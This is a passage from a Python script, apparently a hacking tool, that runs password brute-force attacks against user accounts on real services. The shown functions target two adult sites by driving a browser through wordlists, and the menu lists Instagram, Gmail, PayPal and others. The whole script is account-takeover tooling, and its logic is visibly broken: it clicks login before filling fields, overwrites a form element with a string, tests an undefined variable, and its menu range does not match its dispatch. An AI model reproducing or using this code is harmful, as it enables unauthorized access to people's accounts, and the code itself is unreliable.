        if password not in "passwords"+str(i)+".txt":
            time.sleep(1)
            f.close()
            print("[!] Password Found in File "+str(i)+": "+str(Found))
            time.sleep(2)
            print("[+] Continuing Brute Force with File "+str(i)+"...")
            time.sleep(2)
            continue
        else:
            continue

#Pornhub
def Pornhub():
    time.sleep(1)
    print("[+] Preparing Brute Force Attack for Pornhub...")
    time.sleep(2)
    usname=input("[::] Please enter the Username: ")
    time.sleep(1)
    while usname == None:
        time.sleep(1)
        print("[!] Invalid Username !")
        time.sleep(1)
        usname=input("[::] Please enter again the Username: ")
    print("[!] Initiating Attack !")
    usname = usname.lower()
    usname = usname.strip()
    browser = webdriver.Firefox()
    browser.get("https://www.pornhub.com/login")
    username = browser.find_element_by_id("username")
    password = browser.find_element_by_id("password")
    login = browser.find_element_by_id("submit")
    login.click()
    Found = False
    for i in range(16):
        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
        f.seek(0)
        lines=f.readlines()
        for line in lines:
            content=line[0:-1]
            content=content.strip()
            password = content
            try:
                username.send_keys(usname)
                password.send_keys(password)
            except Exception as e:
                continue
            if e == False:
                time.sleep(1)
                Found = True
                print("[!] Password Found: "+str(Found))
                time.sleep(1)
                print("[+] Password: "+str(password))
                exit(0)
            else:
                continue
        if password not in "passwords"+str(i)+".txt":
            time.sleep(1)
            f.close()
            print("[!] Password Found in File "+str(i)+": "+str(Found))
            time.sleep(2)
            print("[+] Continuing Brute Force with File "+str(i)+"...")
            time.sleep(2)
            continue
        else:
            continue

#Xhamster
def Xhamster():
    time.sleep(1)
    print("[+] Preparing Brute Force Attack for Xhamster...")
    time.sleep(2)
    umail=input("[::] Please enter the Username or the Email: ")
    time.sleep(1)
    while umail == None:
        time.sleep(1)
        print("[!] Invalid Username or Email !")
        time.sleep(1)
        umail=input("[::] Please enter again the Username or the Email: ")
    print("[!] Initiating Attack !")
    umail = umail.lower()
    umail = umail.strip()
    browser = webdriver.Firefox()
    browser.get("https://xhamster.com/login")
    username = browser.find_element_by_id("username")
    password = browser.find_element_by_id("password")
    login = browser.find_element_by_class_name("xh-button button full-width black large square")
    login.click()
    Found = False
    for i in range(16):
        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
        f.seek(0)
        lines=f.readlines()
        for line in lines:
            content=line[0:-1]
            content=content.strip()
            password = content
            try:
                username.send_keys(umail)
                password.send_keys(password)
            except Exception as e:
                continue
            if e == False:
                time.sleep(1)
                Found = True
                print("[!] Password Found: "+str(Found))
                time.sleep(1)
                print("[+] Password: "+str(password))
                exit(0)
            else:
                continue
        if password not in "passwords"+str(i)+".txt":
            time.sleep(1)
            f.close()
            print("[!] Password Found in File "+str(i)+": "+str(Found))
            time.sleep(2)
            print("[+] Continuing Brute Force with File "+str(i)+"...")
            time.sleep(2)
            continue
        else:
            continue
#Main Program

print("\n")
print("[+] Github: @new92")
print("\n")
print("[01] Brute Force Account")
print("[02] Exit")
print("\n")
option=input("[::] Please choose an option: ")
while option != "01" and option != "02" and option != "1" and option != "2" or option == None:
    time.sleep(1)
    print("[!] Invalid option !")
    time.sleep(1)
    option=input("[::] Please enter again: ")
if option == "01" or option == "1":
    time.sleep(1)
    print("\n")
    print("{+} Available Attacks: ")
    print("\n")
    print("#######################")
    print("\n")
    AvailAttacks()
    time.sleep(3)
    print("\n")
    attack = int(input("[::] Please enter the number of the attack: "))
    time.sleep(1)
    while attack <= 0 or attack > 20:
        print("[!] Invalid Attack !")
        time.sleep(1)
        attack = int(input("[::] Please enter again the number of the attack: "))
    if attack == 1:
        Instagram()
    elif attack == 2:
        Facebook()
    elif attack == 3:
        Messenger()
    elif attack == 4:
        Gmail()
    elif attack == 5:
        Reddit()
    elif attack == 6:
        TikTok()
    elif attack == 7:
        Netflix()
    elif attack == 8:
        Pinterest()
    elif attack == 9:
        LinkedIn()
    elif attack == 10:
        Paypal()
    elif attack == 11:
        Snapchat()
    elif attack == 12:
        Spotify()
    elif attack == 13:
        Twitch()
    elif attack == 14:
        Steam()
    elif attack == 15:
        Badoo()
    elif attack == 16:
        Crypto()
    elif attack== 17:
        DropBox()
    elif attack == 18:
        Oracle()
    elif attack == 19:
        StackOverFlow()
    elif attack == 20:
        IGF()
    elif attack == 21:
        FIFA()
    elif attack == 22:
        Zoom()
    elif attack == 23:
        Pornhub()
    elif attack == 24:
        Xhamster()
else:
    print("Exiting...")
    exit(0)
#End of the program
